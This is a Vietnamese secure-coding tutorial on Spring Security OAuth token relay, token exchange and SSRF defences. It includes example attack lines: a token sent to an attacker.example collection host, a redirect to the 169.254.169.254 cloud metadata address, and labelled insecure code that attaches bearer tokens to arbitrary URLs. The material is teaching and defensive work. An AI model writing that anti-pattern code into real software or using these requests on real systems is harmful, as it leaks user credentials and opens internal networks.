# Không chuyển token tùy ý sang URL do người dùng cung cấp

Trong **Spring Security OAuth 2.0 / OIDC Resource Server**, một API đôi khi cần gọi dịch vụ khác thay mặt người dùng: lấy tồn kho, đọc hồ sơ, kiểm tra thanh toán hoặc truy vấn một hệ thống đối tác. Một lỗi thiết kế nguy hiểm là nhận URL từ request rồi gửi HTTP request đến URL đó kèm **Access Token của người dùng hiện tại**.

Ví dụ:

~~~http
POST /api/fetch HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_ACCESS_TOKEN

{
  "url": "https://some-host.example/path"
}
~~~

Nếu backend làm như sau:

~~~java
webClient.get()
    .uri(userSuppliedUrl)
    .headers(headers ->
        headers.setBearerAuth(currentAccessToken))
    .retrieve();
~~~

thì người gọi có thể điều khiển **nơi nhận Bearer Token**. Nếu URL trỏ đến máy chủ do attacker kiểm soát, token có thể bị gửi ra ngoài. Nếu URL trỏ đến địa chỉ nội bộ, cloud metadata service hoặc một dịch vụ quản trị, backend còn có thể trở thành **SSRF proxy** mang credential có quyền cao.

**Quy tắc cốt lõi:** *Không gắn Access Token, ID Token, Refresh Token, cookie phiên hoặc credential nội bộ vào request đến URL do người dùng tùy ý cung cấp.* Token chỉ được gửi tới **resource server đã được ứng dụng xác định và cho phép theo policy**, với audience, scope và phương thức delegation phù hợp.

Nếu nghiệp vụ thật sự cần người dùng cung cấp URL, hãy coi URL đó là **dữ liệu đầu vào không đáng tin**. Có thể xử lý nó bằng một HTTP client tách biệt, không mang credential, với chính sách SSRF/egress riêng. Nếu cần truy cập một downstream OAuth resource, hãy ánh xạ thao tác tới **đích đã đăng ký trong cấu hình tin cậy** hoặc dùng OAuth Token Exchange để lấy token dành riêng cho resource đó.

Bài học thuộc chương **Chuyển tiếp token**, sử dụng **Java 17+, Spring Boot 3.x và Spring Security 6.x** làm bối cảnh. Nội dung giải thích token exfiltration, SSRF, confused deputy, audience và scope, token relay, OAuth Token Exchange, URL allowlist, redirect/DNS controls, tích hợp WebClient/Spring Security, logging và kiểm thử.

## 1. Vì sao chuyển token tới URL tùy ý nguy hiểm?

Access Token dạng Bearer là credential: bên nào có token đều có thể thử dùng nó. Khi backend chuyển token đến một đích khác, backend đang **ủy quyền cho đích đó nắm giữ một credential có thể truy cập tài nguyên**.

~~~text
User
  |
  | Authorization: Bearer T
  | body.url = https://attacker.example/collect
  v
Your API (đã xác thực user)
  |
  | GET https://attacker.example/collect
  | Authorization: Bearer T
  v
Attacker server
  |
  +-- nhận và lưu token T
  +-- replay T tới API có thể chấp nhận nó
~~~

Nếu T có quyền đọc hồ sơ, đơn hàng hoặc dữ liệu tenant, attacker có thể sử dụng token trong phạm vi những quyền đó cho đến khi token hết hạn hoặc bị thu hồi. Việc backend đã xác thực user trước khi chuyển token **không làm cho URL do user cung cấp trở thành đích đáng tin cậy**.

### 1.1. Ba rủi ro xuất hiện cùng lúc

**Token exfiltration:** backend gửi Bearer Token đến host không được phép. Host đó có thể lưu, phân tích hoặc replay token.

**Server-Side Request Forgery (SSRF):** attacker khiến backend kết nối tới địa chỉ mà attacker không thể truy cập trực tiếp, ví dụ loopback, private network, admin endpoint hoặc cloud metadata service.

**Confused deputy:** backend có quyền truy cập mạng và credential của ứng dụng, rồi bị lừa dùng những quyền đó thay cho một caller không có quyền tương ứng.

~~~text
Untrusted URL
    |
    v
Backend dùng network identity của chính nó
    |
    +-- gửi token của user
    +-- truy cập internal network
    +-- gọi API quản trị
    |
    v
Caller đạt được quyền mà caller không có trực tiếp
~~~

Đây là lỗi **đường đi của credential và quyền**, không chỉ là lỗi validate chuỗi URL.

## 2. URL do người dùng cung cấp không phải resource registration

Một ứng dụng có thể cần gọi nhiều downstream services, nhưng các service đó phải được định nghĩa trong cấu hình mà đội vận hành kiểm soát:

| Downstream | Base URI tin cậy | Resource/Audience | Quyền được phép |
| --- | --- | --- | --- |
| Inventory API | `https://inventory.internal.example` | `inventory-api` | `inventory.read` |
| Billing API | `https://billing.internal.example` | `billing-api` | `billing.read` |
| Orders API | `https://orders.internal.example` | `orders-api` | `orders.read`, `orders.write` |

Client có thể yêu cầu nghiệp vụ như “đọc tồn kho SKU-42”. Backend chọn Inventory API từ registry và xây path/query theo contract. Client **không được gửi `https://host-bat-ky` để quyết định nơi Access Token sẽ được gửi**.

### 2.1. Phân biệt locator, resource và credential

| Giá trị | Có thể đến từ request? | Quyết định được gì? |
| --- | --- | --- |
| SKU/order ID | Có, sau validation. | Chọn tài nguyên nghiệp vụ. |
| Tên chức năng `inventory` | Có thể nhận như enum/operation key. | Chọn một downstream đã đăng ký. |
| Raw URL | Có thể là input của chức năng fetch không mang credential. | Không được tự chọn token recipient. |
| Audience/resource ID | Chỉ theo server-side policy. | Token cần được cấp cho resource nào. |
| OAuth client registration ID | Cấu hình phía server. | Credential/client flow được dùng để xin token. |
| Access Token hiện tại | Do authentication layer cung cấp. | Chỉ có thể relay khi downstream được phép nhận chính token đó. |

**URL, hostname, tenant slug hoặc tên dịch vụ do caller gửi không chứng minh caller có quyền nhận token.**

### 2.2. Thiết kế API bằng operation key

Thay vì:

~~~json
{
  "url": "https://any-host.example/api/orders/42"
}
~~~

hãy thiết kế:

~~~json
{
  "operation": "inventory.lookup",
  "sku": "SKU-42"
}
~~~

Backend map `inventory.lookup` tới Inventory API đã đăng ký. Client chỉ chọn một **nghiệp vụ được cho phép**, không chọn network destination hoặc token audience.

## 3. Token chỉ dành cho resource có audience phù hợp

Access Token có thể mang claim `aud` để chỉ định resource server:

~~~json
{
  "iss": "https://identity.example.test",
  "sub": "person-42",
  "aud": ["orders-api"],
  "scope": "orders.read",
  "exp": 1893456000
}
~~~

Token trên được phát hành cho `orders-api`. Việc gửi nó đến:

~~~text
https://attacker.example/collect
https://billing.internal.example
https://admin.internal.example
~~~

không biến nó thành token hợp lệ cho các host đó. Một resource server được thiết kế đúng sẽ xác minh issuer, audience, thời hạn, chữ ký/introspection và quyền. Tuy nhiên, **không nên dựa vào downstream từ chối token để bảo vệ bí mật**: host nhận request vẫn có thể lưu raw token trước khi kiểm tra.

### 3.1. Audience không phải hostname

Audience thường là identifier của resource theo hợp đồng Authorization Server. Nó có thể là URI hoặc một chuỗi resource ID, nhưng không nên tự động suy ra audience từ URL user gửi.

~~~text
User URL: https://billing.example.test
Không có nghĩa:
  requested_audience = "https://billing.example.test"
~~~

Nếu client được phép yêu cầu mọi audience tùy ý, backend có thể trở thành token minting/delegation proxy. Hãy dùng server-side mapping:

~~~text
operation = inventory.lookup
        |
        v
trusted downstream = INVENTORY
        |
        v
resource = inventory-api
scope = inventory.read
~~~

### 3.2. Scope không bù cho audience sai

Token có `scope=orders.read` không mặc nhiên được phép gửi đến mọi API có endpoint `/orders`. Audience và scope trả lời hai câu hỏi khác nhau:

- **Audience:** token dành cho resource nào?
- **Scope:** token được phép thực hiện nhóm hành động nào theo contract?

Resource Server phải kiểm tra cả hai. Backend cũng không được tự gửi token sang một resource khác rồi hy vọng scope đủ hẹp sẽ bảo vệ nó.

## 4. Phân biệt token relay với token exchange

Hai cơ chế có mục đích khác nhau.

### 4.1. Token relay: chuyển tiếp đúng token hiện tại

Token relay gửi Access Token hiện tại tới một downstream service đã được xác định:

~~~text
Browser -- Bearer T_orders --> API Gateway
                                  |
                                  | Bearer T_orders
                                  v
                              Orders Service
~~~

Relay chỉ phù hợp khi downstream là **resource được token dành tới**, có trust boundary phù hợp và chính sách cho phép token delegation như vậy. Relay không đổi audience, không downscope và không tạo credential mới.

### 4.2. Token exchange: xin token dành cho resource khác

Nếu API A cần gọi API B bằng danh tính/delegation phù hợp, có thể dùng **OAuth 2.0 Token Exchange** theo RFC 8693 nếu Authorization Server hỗ trợ:

~~~text
Client -- Access Token T_A --> API A
                                  |
                                  | subject_token = T_A
                                  | requested resource = B
                                  v
                         Authorization Server
                                  |
                                  | Access Token T_B
                                  | aud = B
                                  | scope = tối thiểu
                                  v
                              API A -- T_B --> API B
~~~

T_B là token được AS phát hành theo policy cho resource B. Backend không tự sửa `aud` hoặc `scope` của T_A; việc phát hành credential mới do AS quyết định.

### 4.3. Bảng so sánh

| Tiêu chí | Token relay | Token exchange |
| --- | --- | --- |
| Token downstream nhận | Chính Access Token hiện tại. | Token mới được AS phát hành. |
| Audience | Phải vốn đã phù hợp downstream. | Có thể yêu cầu resource/audience khác theo policy AS. |
| Scope | Không tự thay đổi. | AS có thể downscope/áp quyền delegation. |
| Credential mới | Không. | Có. |
| Khi nào dùng | Downstream thuộc cùng resource trust boundary và chấp nhận token đó. | Gọi resource khác hoặc cần token riêng. |
| URL user-provided | Không được quyết định recipient. | Không được quyết định tùy ý audience/resource. |

### 4.4. Token exchange không phải “cho user chọn audience bất kỳ”

Ngay cả khi AS hỗ trợ RFC 8693, backend phải kiểm soát:

- Những resource/audience được phép.
- Những loại subject token được phép exchange.
- Client nào được quyền exchange.
- Scope/actor/delegation policy.
- Token lifetime và sender constraint.
- Quan hệ giữa người dùng, tenant và downstream operation.

Không chuyển nguyên giá trị `audience` hoặc `resource` từ request thành token exchange parameter mà không qua policy. Token exchange là **cơ chế delegation có kiểm soát**, không phải endpoint proxy để xin token cho host tùy ý.

## 5. Các anti-pattern cần tránh

### 5.1. Gắn token vào WebClient nhận URL tùy ý

~~~java
// KHÔNG LÀM.
Mono<String> fetch(String url, String accessToken) {
    return WebClient.create()
        .get()
        .uri(url)
        .headers(headers ->
            headers.setBearerAuth(accessToken))
        .retrieve()
        .bodyToMono(String.class);
}
~~~

Caller kiểm soát `url`, còn backend cung cấp token. Đây là token exfiltration và có thể là SSRF.

### 5.2. Dùng current Authentication để gọi mọi host

~~~java
// KHÔNG LÀM.
String target = request.getParameter("url");
webClient.get()
    .uri(target)
    .headers(headers ->
        headers.setBearerAuth(currentBearerToken()))
    .retrieve();
~~~

Việc token lấy từ SecurityContext không làm URL an toàn hơn. SecurityContext cho biết request hiện tại đã được xác thực; nó không cấp quyền gửi credential đến bất kỳ host nào.

### 5.3. Tự tạo token exchange request từ URL

~~~java
// KHÔNG LÀM.
String resource = request.getParameter("url");
tokenExchangeClient.exchange(
    incomingToken,
    resource
);
~~~

URL không phải resource identifier đáng tin. Attacker có thể yêu cầu AS phát token cho resource không nằm trong policy của ứng dụng nếu backend được cấp quyền exchange rộng.

### 5.4. Đưa token vào query parameter

~~~http
GET https://partner.example/fetch?access_token=SECRET
~~~

Token có thể xuất hiện trong access logs, proxy logs, browser history, analytics, referrer hoặc hệ thống quan sát. Với HTTP API, credential phải đi qua cơ chế Authorization header theo contract; nhưng **không có header nào làm URL tùy ý trở thành recipient an toàn**.

## 6. Quy trình chọn downstream an toàn

~~~text
1. Xác thực incoming request
          |
2. Validate operation và business input
          |
3. Kiểm tra user/tenant có quyền gọi operation
          |
4. Map operation -> trusted downstream registration
          |
5. Chọn token phù hợp:
     - relay nếu audience/resource đã phù hợp
     - token exchange nếu cần token dành cho downstream
          |
6. Gọi base URI cố định từ registry
          |
7. Validate response và map về domain model
~~~

**Authorization quyết định cả operation lẫn recipient.** Chỉ validate hostname trong một hàm riêng mà không kiểm tra người dùng có quyền gọi downstream vẫn có thể tạo confused deputy.

### 6.1. Registry đích ở server-side

~~~java
import java.net.URI;
import java.util.Map;

public enum DownstreamService {
    INVENTORY,
    BILLING,
    ORDERS
}

public record DownstreamTarget(
    URI baseUri,
    String clientRegistrationId,
    String resourceId
) {}

public final class DownstreamRegistry {

    private final Map<DownstreamService, DownstreamTarget> targets =
        Map.of(
            DownstreamService.INVENTORY,
            new DownstreamTarget(
                URI.create("https://inventory.internal.example"),
                "inventory-client",
                "inventory-api"),
            DownstreamService.BILLING,
            new DownstreamTarget(
                URI.create("https://billing.internal.example"),
                "billing-client",
                "billing-api"),
            DownstreamService.ORDERS,
            new DownstreamTarget(
                URI.create("https://orders.internal.example"),
                "orders-client",
                "orders-api")
        );

    public DownstreamTarget require(DownstreamService service) {
        DownstreamTarget target = targets.get(service);
        if (target == null) {
            throw new IllegalArgumentException(
                "Downstream service is not registered");
        }
        return target;
    }
}
~~~

Đây là ví dụ cấu hình tĩnh. Trong production, registry có thể lấy từ configuration service/secret manager có RBAC và audit. **Không thêm entry mới từ request public**.

### 6.2. Không nhận raw URI trong service method

Ưu tiên:

~~~java
public Mono<InventoryItem> lookupInventory(String sku) {
    // Target được chọn bởi server-side service, không bởi caller URL.
    return inventoryClient.get()
        .uri(builder -> builder
            .path("/v1/items/{sku}")
            .build(sku))
        .retrieve()
        .bodyToMono(InventoryItem.class);
}
~~~

Không thiết kế:

~~~java
public Mono<String> callDownstream(URI arbitraryUri) {
    // URI có thể đến từ request, message hoặc database không tin cậy.
}
~~~

`WebClient.Builder.baseUrl(...)` **không phải ranh giới bảo mật nếu code vẫn cho truyền absolute URI**: một URI tuyệt đối có thể thay base URL. Hãy giữ WebClient trong một adapter hẹp, expose các thao tác domain có đường dẫn tương đối đã kiểm soát và không nhận URL tùy ý.

## 7. Spring Security: relay token tới một downstream đã tin cậy

Trong ứng dụng Servlet, Spring Security có `ServletBearerExchangeFilterFunction` cho WebClient. Filter này lấy Bearer token từ SecurityContext và thêm Authorization header cho request outbound.

~~~java
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.oauth2.server.resource.web.reactive.function.client.ServletBearerExchangeFilterFunction;
import org.springframework.web.reactive.function.client.WebClient;

@Configuration
public class InventoryClientConfiguration {

    @Bean
    WebClient inventoryWebClient(WebClient.Builder builder) {
        return builder
            .baseUrl("https://inventory.internal.example")
            .filter(new ServletBearerExchangeFilterFunction())
            .build();
    }
}
~~~

Adapter gọi downstream:

~~~java
import reactor.core.publisher.Mono;
import org.springframework.stereotype.Component;
import org.springframework.web.reactive.function.client.WebClient;

@Component
public class InventoryClient {

    private final WebClient inventoryWebClient;

    public InventoryClient(WebClient inventoryWebClient) {
        this.inventoryWebClient = inventoryWebClient;
    }

    public Mono<InventoryItem> findBySku(String sku) {
        return inventoryWebClient.get()
            .uri(builder -> builder
                .path("/v1/items/{sku}")
                .build(sku))
            .retrieve()
            .bodyToMono(InventoryItem.class);
    }
}
~~~

### 7.1. Filter relay không kiểm tra audience cho bạn

`ServletBearerExchangeFilterFunction` là **cơ chế chuyển tiếp token hiện tại**, không phải policy engine xác định host/audience nào được nhận token. Nó không biến Access Token dành cho API A thành token dành cho API B.

Chỉ dùng filter này khi:

- Downstream là service đã đăng ký/tin cậy.
- Token hiện tại có audience phù hợp với downstream theo contract.
- Scope và delegation policy cho phép thao tác.
- Không có code path cho phép gọi client này với arbitrary absolute URI.
- Redirect, proxy và network egress được kiểm soát.

Nếu downstream cần token riêng, dùng OAuth client/token exchange thay vì relay.

### 7.2. Cẩn thận với WebClient baseUrl

Đoạn code trên dùng relative URI được xây trong `InventoryClient`. Không expose WebClient ra controller để caller truyền URL:

~~~java
// Không expose một hàm như thế này:
Mono<String> fetch(URI uri) {
    return inventoryWebClient.get()
        .uri(uri)
        .retrieve()
        .bodyToMono(String.class);
}
~~~

Một URI tuyệt đối có thể ghi đè base URL. **Base URL cố định là một lớp cấu hình hữu ích, nhưng typed adapter và input contract mới là ranh giới kiểm soát thực tế.**

### 7.3. Filter relay không refresh token

Filter relay chuyển tiếp Bearer token hiện có trong SecurityContext; nó không tự thực hiện OAuth authorization flow hoặc bảo đảm token còn hợp lệ cho resource khác. Nếu cần client credentials, refresh hoặc token exchange, dùng `OAuth2AuthorizedClientManager`/client registration phù hợp và resource mapping server-side.

## 8. Dùng OAuth2AuthorizedClientManager cho downstream client riêng

Khi backend có client registration riêng cho Inventory API, có thể dùng Spring Security OAuth2 Client để quản lý Access Token của downstream theo registration.

~~~java
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientProvider;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientProviderBuilder;
import org.springframework.security.oauth2.client.registration.ClientRegistrationRepository;
import org.springframework.security.oauth2.client.web.DefaultOAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.web.OAuth2AuthorizedClientRepository;

@Configuration
public class OAuthClientConfiguration {

    @Bean
    OAuth2AuthorizedClientManager authorizedClientManager(
            ClientRegistrationRepository registrations,
            OAuth2AuthorizedClientRepository authorizedClients) {

        OAuth2AuthorizedClientProvider provider =
            OAuth2AuthorizedClientProviderBuilder.builder()
                .authorizationCode()
                .refreshToken()
                .clientCredentials()
                .build();

        DefaultOAuth2AuthorizedClientManager manager =
            new DefaultOAuth2AuthorizedClientManager(
                registrations, authorizedClients);

        manager.setAuthorizedClientProvider(provider);
        return manager;
    }
}
~~~

Ví dụ cấu hình client registration:

~~~yaml
spring:
  security:
    oauth2:
      client:
        registration:
          inventory-client:
            provider: company-idp
            client-id: inventory-backend
            client-secret: INVENTORY_CLIENT_SECRET_FROM_SECRET_STORE
            authorization-grant-type: client_credentials
            scope:
              - inventory.read
        provider:
          company-idp:
            token-uri: https://identity.example.test/oauth2/token
~~~

Secret trong ví dụ là placeholder; production phải lấy từ secret manager hoặc cơ chế cấu hình an toàn. Với `client_credentials`, token đại diện service/client theo policy AS, **không tự đại diện user cuối**. Nếu downstream cần hành động thay user, cần delegation/token exchange theo AS contract.

### 8.1. Dùng registration ID đã biết, không nhận từ request tùy ý

Một client có thể chọn từ enum/operation:

~~~java
String registrationId =
    switch (operation) {
        case INVENTORY_LOOKUP -> "inventory-client";
        case BILLING_STATUS -> "billing-client";
    };
~~~

Đây là mapping minh họa. Không làm:

~~~java
String registrationId =
    request.getParameter("oauthClientRegistrationId");
~~~

nếu caller có thể chọn một registration có quyền rộng hơn, ví dụ admin API hoặc billing write.

## 9. Khi cần gọi resource khác: Token Exchange

**RFC 8693 — OAuth 2.0 Token Exchange** định nghĩa cách một client trình subject token để xin token mới có audience/resource, actor hoặc quyền delegation theo policy.

~~~http
POST /oauth2/token HTTP/1.1
Host: identity.example.test
Content-Type: application/x-www-form-urlencoded
Authorization: Basic BACKEND_CLIENT_CREDENTIALS

grant_type=urn:ietf:params:oauth:grant-type:token-exchange&
subject_token=INCOMING_ACCESS_TOKEN&
subject_token_type=urn:ietf:params:oauth:token-type:access_token&
requested_token_type=urn:ietf:params:oauth:token-type:access_token&
audience=inventory-api&
scope=inventory.read
~~~

Đây là ví dụ minh họa; tham số `audience`/`resource`, actor token và client authentication tùy AS hỗ trợ và profile. Không phải mọi Authorization Server đều triển khai RFC 8693.

Luồng:

1. API A xác thực incoming Access Token.
2. API A kiểm tra user/tenant có quyền thực hiện operation.
3. Server-side policy chọn resource `inventory-api`.
4. API A gọi AS token exchange với subject token và resource/scope được phép.
5. AS xác thực client, subject token và delegation policy.
6. AS phát hành token mới T_B theo audience/scope phù hợp.
7. API A gọi Inventory API tại base URI đã đăng ký bằng T_B.

**Không gửi incoming token tới URL user cung cấp**, và không cho caller tự chọn audience/resource tùy ý.

### 9.1. Downscoping

~~~text
Incoming token:
  aud = api-a
  scope = orders.read orders.write billing.read

Exchanged token:
  aud = inventory-api
  scope = inventory.read
~~~

AS quyết định có cho phép phép chuyển đổi đó không. Backend không thể tự xóa claim trong token cũ hoặc đổi `aud` rồi coi đó là credential hợp lệ.

### 9.2. Identity delegation

Token mới có thể đại diện subject token, actor/client hoặc một delegation chain theo AS policy. Cần audit actor-subject relationship phù hợp nhưng không ghi raw tokens. Downstream phải xác minh issuer/audience/scope và delegation claims theo contract.

## 10. Nếu người dùng thật sự cần nhập URL

Có những nghiệp vụ hợp lệ như tải tài liệu công khai, kiểm tra webhook endpoint, import dữ liệu từ host đối tác hoặc đọc một public resource. Trong những trường hợp đó, **tách chức năng fetch URL khỏi credential propagation**.

~~~text
User URL
   |
   v
URL fetch service (không có user Access Token)
   |
   +-- URL/scheme/host policy
   +-- DNS/IP and egress policy
   +-- redirect policy
   +-- timeout/size/content-type limits
   |
   v
Untrusted response data
   |
   v
Parse/validate -> domain data
~~~

Fetch service không được tự gắn:

- Bearer token của người dùng.
- ID Token.
- Refresh Token.
- Session cookie.
- Internal API key hoặc cloud credentials.

Nếu đối tác cần authentication, hãy dùng **partner integration đã đăng ký** với credential riêng, scope/resource rõ ràng và host được kiểm soát. Không tái sử dụng token của user như một cách đăng nhập vào partner URL.

## 11. SSRF controls cho URL fetcher không mang token

Không chuyển token đã giúp giảm rủi ro lộ credential, nhưng URL fetcher vẫn có thể trở thành SSRF proxy.

### 11.1. Scheme, host và port

Policy có thể:

- Chỉ cho phép HTTPS.
- Từ chối userinfo trong URL như `https://user:pass@host`.
- Giới hạn port, thường chỉ port cần thiết.
- Dùng hostname allowlist exact nếu nghiệp vụ có tập đối tác xác định.
- Từ chối loopback, link-local, private, multicast, reserved và metadata IP ranges theo môi trường.
- Chuẩn hóa hostname/IDN/punycode và kiểm tra canonical host.
- Từ chối URL có encoding/authority bất thường hoặc parser ambiguity.

Không dựa trên phép kiểm tra chuỗi kiểu:

~~~java
if (url.startsWith("https://trusted.example")) {
    allow();
}
~~~

vì `https://trusted.example.attacker.invalid`, userinfo, port, encoding và các dạng URI khác có thể làm kiểm tra sai.

### 11.2. DNS rebinding và IP validation

Kiểm tra hostname một lần rồi để HTTP client tự resolve lại có thể tạo race:

~~~text
Validation DNS: host -> public IP
Connection DNS: host -> 127.0.0.1
~~~

Biện pháp cần phối hợp:

- Resolve và kiểm tra toàn bộ A/AAAA records theo policy.
- Chặn egress ở network/firewall/service mesh để request không tới private ranges.
- Dùng resolver/connector bảo đảm kết nối tới IP đã được xác minh, nhưng vẫn giữ TLS hostname verification.
- Không bỏ qua kiểm tra TLS chỉ vì đã pin IP.
- Áp chính sách ở nhiều lớp; application validation không thay network egress restrictions.

### 11.3. Redirect có thể vượt allowlist ban đầu

Giả sử URL ban đầu hợp lệ:

~~~http
GET /file HTTP/1.1
Host: partner.example

HTTP/1.1 302 Found
Location: http://169.254.169.254/latest/meta-data/
~~~

Nếu HTTP client tự follow redirect, backend có thể truy cập địa chỉ nội bộ dù URL ban đầu đã được allowlist. Cách bảo thủ:

- Tắt tự động redirect cho fetcher nhận URL không tin cậy.
- Nếu cần redirect, validate **mọi hop** bằng cùng URL/IP/port/egress policy.
- Giới hạn redirect count.
- Không mang Authorization/Cookie headers qua origin khác.
- Kiểm tra scheme downgrade HTTPS → HTTP.

Đối với client mang OAuth token, lựa chọn tốt nhất là **không cho phép redirect tùy ý**. Đừng dựa vào việc một thư viện HTTP cụ thể tự strip Authorization trên cross-origin redirects mà chưa kiểm tra phiên bản và cấu hình.

### 11.4. Giới hạn response

URL công khai cũng có thể trả body rất lớn, content type sai, response nén bất thường, stream không kết thúc, redirect loop hoặc header nguy hiểm. Đặt timeout, giới hạn kích thước sau giải nén, giới hạn content type, connection pool, concurrency và cancellation. Parse nội dung theo schema; không render HTML/execute script hoặc tin response như dữ liệu nội bộ.

## 12. Redirect và Authorization header khi chuyển tiếp token

Ngay cả khi backend gọi một downstream đã đăng ký, cần xác định redirect behavior:

~~~text
Trusted API A
  |
  +-- 302 Location: https://other-host.example/path
~~~

Nếu client HTTP follow redirect, có nguy cơ credential bị chuyển sang host khác tùy thư viện/phiên bản. Đối với request mang Access Token:

1. Tắt redirects theo mặc định nếu không cần.
2. Nếu redirect là contract, kiểm tra đích đến có cùng trust origin/resource hay không.
3. Không forward Authorization header sang origin khác.
4. Không tự động gửi token lại cho URL mới chỉ vì response là 301/302/307/308.
5. Với redirect sang resource khác, thực hiện resource selection/token exchange bằng policy riêng.

**Redirect là một lần thay đổi recipient.** Nó cần được xem như quyết định bảo mật, không chỉ là chi tiết HTTP.

## 13. Token relay ở API Gateway và Spring Cloud Gateway

Gateway có thể có filter tên `TokenRelay` để chuyển OAuth2 Access Token của user tới downstream route. Điều này tiện lợi khi route đã được cấu hình tin cậy:

~~~text
User -> Gateway
        |
        +-- route /orders/** -> Orders Service
        |       token relay
        |
        +-- route /billing/** -> Billing Service
                token relay hoặc token exchange riêng
~~~

Nhưng route phải được cấu hình server-side:

- `/orders/**` map tới Orders Service đã đăng ký.
- `/billing/**` map tới Billing Service đã đăng ký.
- Incoming token phải có audience/delegation phù hợp.
- Không tạo route từ URL do request body/query/header chỉ định.
- Không cho caller tự chọn route nội bộ không được cấp quyền.

TokenRelay chỉ chuyển token; nó không tự downscope, đổi audience hoặc bảo đảm token được resource đích chấp nhận. Kiểm tra behavior và cấu hình đúng phiên bản Spring Cloud Gateway đang dùng.

## 14. Token sai resource: downstream có thể từ chối nhưng token vẫn bị lộ

Một sai lầm phổ biến:

> “Không sao, token có audience orders-api; billing-api sẽ tự từ chối.”

Billing API đúng là nên từ chối token có audience sai. Nhưng backend vẫn đã **gửi token tới Billing host**. Billing host hoặc proxy trước nó có thể log header, lưu request hoặc bị compromise. Audience validation bảo vệ quyền truy cập tại resource server, **không ngăn credential bị lộ trên đường gửi**.

Vì vậy cần hai lớp:

1. **Recipient control:** không gửi token đến host không được phép nhận nó.
2. **Resource validation:** downstream xác minh audience/issuer/scope và các claim liên quan.

Không dùng lớp thứ hai để bù cho việc thiếu lớp thứ nhất.

## 15. Credential nào tuyệt đối không được relay tùy ý?

| Credential | Có thể gửi tới URL user nhập? | Vì sao |
| --- | --- | --- |
| User Access Token | **Không** | Bearer credential có quyền truy cập resource. |
| Refresh Token | **Không** | Có thể cấp Access Token mới, thường nhạy cảm hơn. |
| OIDC ID Token | **Không** | Dành cho client/RP nhận diện user, không phải API bearer credential. |
| Session cookie | **Không** | Có thể chiếm phiên đăng nhập ứng dụng. |
| OAuth client secret | **Không** | Có thể giả mạo confidential client. |
| API key/service token | **Không** | Credential nội bộ có thể có quyền rộng. |
| mTLS private key | **Không** | Private key không được gửi qua HTTP. |
| DPoP private key | **Không** | Private signing key thuộc client. |

Ngay cả khi downstream URL thuộc đối tác hợp lệ, cần **credential riêng được cấp cho integration đó**, không mượn credential của user tùy tiện.

## 16. Logging, tracing và error handling

Token forwarding có thể bị lộ ngoài request body:

- HTTP client wire logs.
- Reverse proxy/access logs.
- Distributed tracing span attributes.
- Exception messages có request headers.
- Metrics labels.
- Debug dumps hoặc heap dumps.

### 16.1. Không log credential

Không ghi:

~~~text
Authorization: Bearer eyJ...
Cookie: SESSION=...
refresh_token=...
client_secret=...
~~~

Trong logging/tracing, redact:

- `Authorization`.
- `Proxy-Authorization`.
- `Cookie`/`Set-Cookie`.
- `access_token`, `refresh_token`, `id_token`.
- OAuth client credentials và private-key material.

Không đưa raw URL có query chứa secret vào logs. Tránh ghi toàn bộ response body từ một URL không tin cậy; nó có thể chứa dữ liệu nhạy cảm hoặc payload độc hại.

### 16.2. Error response không nên tiết lộ token

Khi downstream trả 401/403, không trả raw upstream headers/body cho caller nếu chúng có token, stack trace hoặc internal hostnames. Map thành lỗi domain/API phù hợp và giữ correlation ID để điều tra.

### 16.3. Trace outbound request an toàn

Có thể ghi tên downstream đã đăng ký, operation ID, correlation ID, status code, latency và error category. Không ghi token, secret hoặc toàn bộ claims. Nếu cần liên kết sự kiện authentication, dùng identifier nội bộ được bảo vệ và giới hạn retention.

## 17. Kiểm thử chống token exfiltration và SSRF

Kiểm thử không chỉ xác nhận endpoint downstream trả 200; cần chứng minh token **chỉ được gửi đến recipient được phép**.

### 17.1. Ma trận kiểm thử

| Tình huống | Kết quả mong đợi |
| --- | --- |
| Operation `inventory.lookup` | Gọi Inventory API đã đăng ký. |
| Caller gửi URL attacker trong field `url` | Không chuyển token; URL bị bỏ qua/từ chối theo API contract. |
| Caller yêu cầu audience tùy ý | Không dùng trực tiếp; server-side policy quyết định resource. |
| Caller chọn registration ID có quyền admin | Từ chối nếu operation không cho phép. |
| Token `aud=orders-api` được relay tới Orders API | Chỉ khi policy cho phép và scope đủ. |
| Token `aud=orders-api` gửi tới Billing host | Backend không gửi; dùng token exchange nếu được phép. |
| Downstream redirect sang attacker host | Không follow hoặc không chuyển credential. |
| URL fetcher nhận loopback/private/link-local | Từ chối. |
| DNS trả public rồi đổi private (rebinding) | Egress controls ngăn kết nối nội bộ. |
| URL có userinfo/port lạ/encoded host | Từ chối theo parser/canonicalization policy. |
| HTTP URL hoặc HTTPS downgrade redirect | Từ chối. |
| URL fetcher nhận response quá lớn/timeout | Dừng theo giới hạn. |
| AS token exchange yêu cầu resource không allowlist | Backend không gửi request exchange đó. |
| Token exchange trả audience khác dự kiến | Không gọi downstream. |
| HTTP client wire logging bật | Authorization/secret được redact. |
| User không có quyền operation nhưng backend có client credentials | Từ chối trước khi gọi downstream. |

### 17.2. Test chứng minh token không rời khỏi trust boundary

Một integration test có thể dựng:

~~~text
Fake Inventory server:
  ghi nhận request và Authorization header

Fake attacker server:
  ghi nhận mọi request/headers

Application:
  POST /api/inventory/lookup
  POST /api/fetch với URL attacker
~~~

Kỳ vọng:

- Request operation hợp lệ tới Inventory server theo token policy.
- Request URL attacker không mang incoming Access Token.
- Attacker server không nhận Authorization header, Cookie hoặc secret nội bộ.
- Không có request outbound tới private/metadata IP.
- Redirect từ Inventory server sang origin không tin cậy không mang credential.

Không dùng credential production trong test. Dùng token giả và test servers cô lập.

### 17.3. Test token exchange

1. AS fixture nhận token exchange request.
2. Xác minh backend chọn resource từ server-side registry.
3. Gửi request có user input cố đổi audience thành attacker resource.
4. Backend phải từ chối trước khi gọi AS hoặc bỏ qua field không được phép.
5. Khi exchange thành công, kiểm tra token mới có audience/scope dự kiến.
6. Downstream mock xác minh token mới, không phải token incoming.

## 18. Các kiến trúc tham khảo

### 18.1. Downstream cùng audience: relay có kiểm soát

~~~text
Client
  |
  | T (aud=orders-api)
  v
Orders BFF / API
  |
  | operation=read-order
  | trusted target = Orders API
  | relay T
  v
Orders API
  |
  +-- validates T and orders.read
~~~

